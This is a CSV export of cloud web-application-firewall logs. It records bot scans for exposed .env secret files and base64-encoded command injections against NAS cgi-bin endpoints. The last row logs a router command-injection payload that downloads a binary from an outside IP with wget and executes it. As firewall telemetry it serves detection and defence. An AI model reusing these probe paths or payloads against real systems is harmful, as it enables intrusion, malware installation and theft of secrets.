TenantId,"TimeGenerated [Local Time]",OperationName,InstanceId,ClientIp,ClientPort,RequestUri,RuleSetType,RuleSetVersion,RuleId,Message,Action,Site,DetailedMessage,DetailedData,FileDetails,LineDetails,Hostname,TransactionId,SourceSystem,Type,"_ResourceId"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/.envs",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",7a989e9f94e9822fe29487b0c8fcf6e2,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/api/.env.production",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",8d01f004f47e3cfa2fa04e6b3ca68237,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/server/backend/.env.production",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",a76324722b9083aadf7de21b9ad4d021,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.docker/laravel/app/.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",236a96f7306fea7351401697fd9bde57,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env-sample",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",b764852a51ba3055e0525d7a9c437029,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env.dist",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",9b72ad8813427e28965765e9359a14ba,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env.dev",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",22673b4aba7c0c0162c26edff0e03522,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/api/.env.prod",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",97dedfa085c16e14fe3c76037bf3d763,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.docker/.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",280ee7041adc932c45163194b5fc8584,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/server/backend/.env.prod",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",c52f2f7f43e784f3572aab5ba4c03daa,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env.dev.local",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",00af2be9efd45b070ed545ebb75c805b,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env.sample",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",8b3faa646de30eb5b315b97d55aa2f70,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env.backup",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",7c19e108dd640b5d09fe1cb50974a4c0,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env.production",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",c575b7f6256ed7cab3551213348d0f82,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env~",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",dc44190b229ab6bc752dde944477b463,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env.prod.local",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",f07e25e390f54b423d6f7a60ccd81723,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.gitlab-ci/.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",195db92c18aa1607f067fa144945c67b,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.env.docker",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",348722bd37850523287c6d0232e06c1b,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:47.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/.c9/metadata/environment/.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",5e7facab08763cc18b4006ede7e49260,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/backend/.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",9fa34db78a97239b0915c3d7992ab39b,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/server/backend/.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",e0bfabc0861351898a4dee8fffbcc98a,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",c4998176e30aa93af14b2c87bdbafd19,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/backend/.env.production",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",2371cc24d423b13710890657b77b999d,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/backend/.env.prod",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",a5dc28c3a84e2754ecdcbe411909046e,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/sendgrid.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",b522182394aafb4276590e76c17fcb54,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/.environment",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",82c2909869705df3d9d1fb7214f4dc9f,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/secrets.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",9772d65d6c5ccce4b6efed13392335d8,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/.env.production.local",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",cc0e858add445a831ceb050478130a7c,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_1","203.55.81.13",,"/.env.save",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",dd9abe0733444d78bd083a7fc2726c47,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/production.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",203f2ef7f8b8276157de67b6843dfdb0,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:36:49.000 AM",ApplicationGatewayFirewall,"appgw_3","203.55.81.13",,"/api/.env",MicrosoftBotProtection,,,"Found bot IP address 203.55.81.13 in RemoteAddr",Detected,,,,,,"51.8.97.212",51eaf920304cc32c338a7cc36f9cfc08,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:58:31.000 AM",ApplicationGatewayFirewall,"appgw_3","103.245.236.120",,"/cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=",MicrosoftBotProtection,,,"Found bot IP address 103.245.236.120 in RemoteAddr",Detected,,,,,,"51.8.97.212:80",298d5ddd003cb55d5e3387b9d35e3244,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:58:31.000 AM",ApplicationGatewayFirewall,"appgw_3","103.245.236.120",,"/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=",MicrosoftBotProtection,,,"Found bot IP address 103.245.236.120 in RemoteAddr",Detected,,,,,,"51.8.97.212:80",3c38a7b766f397a1190600c173a49b66,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:58:31.000 AM",ApplicationGatewayFirewall,"appgw_3","103.245.236.120",,"/.most/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=",MicrosoftBotProtection,,,"Found bot IP address 103.245.236.120 in RemoteAddr",Detected,,,,,,"51.8.97.212:80",4f277bc0eb70be64edf21b8a84f97353,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:58:40.000 AM",ApplicationGatewayFirewall,"appgw_1","73.94.231.120",,"/","OWASP CRS","3.2",920350,"Host header is a numeric IP address",Matched,,"Pattern match ^[\d.:]+$ at REQUEST_HEADERS:host.","{51.8.97.212 found within [REQUEST_HEADERS:Host:51.8.97.212]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",666,"51.8.97.212",dbad00840975ecb557fca4d3542aebb9,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:07:10.000 AM",ApplicationGatewayFirewall,"appgw_3","35.203.210.99",,"/","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"51.8.97.212:80",630bef1eb3149db15991633fab54c0c6,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:07:10.000 AM",ApplicationGatewayFirewall,"appgw_3","35.203.210.99",,"/","OWASP CRS","3.2",949110,"Inbound Anomaly Score Exceeded (Total Score: 5)",Detected,,"Greater and Equal to Tx:inbound_anomaly_score_threshold at TX:anomaly_score.",,"REQUEST-949-BLOCKING-EVALUATION.conf",79,"51.8.97.212:80",630bef1eb3149db15991633fab54c0c6,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:07:10.000 AM",ApplicationGatewayFirewall,"appgw_3","35.203.210.99",,"/login.php","OWASP CRS","3.2",920350,"Host header is a numeric IP address",Matched,,"Pattern match ^[\d.:]+$ at REQUEST_HEADERS:host.","{51.8.97.212:80 found within [REQUEST_HEADERS:Host:51.8.97.212:80]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",666,"51.8.97.212:80",5602d77649293c094ea26d4fcbc87024,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:07:10.000 AM",ApplicationGatewayFirewall,"appgw_3","35.203.210.99",,"/login.php","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"51.8.97.212:80",5602d77649293c094ea26d4fcbc87024,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:07:10.000 AM",ApplicationGatewayFirewall,"appgw_3","35.203.210.99",,"/login.php","OWASP CRS","3.2",949110,"Inbound Anomaly Score Exceeded (Total Score: 5)",Detected,,"Greater and Equal to Tx:inbound_anomaly_score_threshold at TX:anomaly_score.",,"REQUEST-949-BLOCKING-EVALUATION.conf",79,"51.8.97.212:80",5602d77649293c094ea26d4fcbc87024,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:07:10.000 AM",ApplicationGatewayFirewall,"appgw_3","35.203.210.99",,"/","OWASP CRS","3.2",920350,"Host header is a numeric IP address",Matched,,"Pattern match ^[\d.:]+$ at REQUEST_HEADERS:host.","{51.8.97.212:80 found within [REQUEST_HEADERS:Host:51.8.97.212:80]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",666,"51.8.97.212:80",630bef1eb3149db15991633fab54c0c6,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:15:00.000 AM",ApplicationGatewayFirewall,"appgw_1","195.1.144.109",,"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)","OWASP CRS","3.2",932130,"Remote Command Execution: Unix Shell Expression or Confluence Vulnerability (CVE-2022-26134) Found",Matched,,"Pattern match (?:\$(?:\((?:\(.*\)|.*)\)|\{.*\})|[<>]\(.*\)) at ARGS.","{$(id>`cd/tmp rm -rf shk wget http://103.14.226.142/shk chmod 777 shk ./shk tplink rm -rf shk`) found within [ARGS:country:$(id>`cd /tmp; rm -rf shk; wget http://103.14.226.142/shk; chmod 777 shk; ./shk tplink; rm -rf shk`)]}","REQUEST-932-APPLICATION-ATTACK-RCE.conf",346,"51.8.97.212:80",cb866c2f3d0693d6398b97923353edc8,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
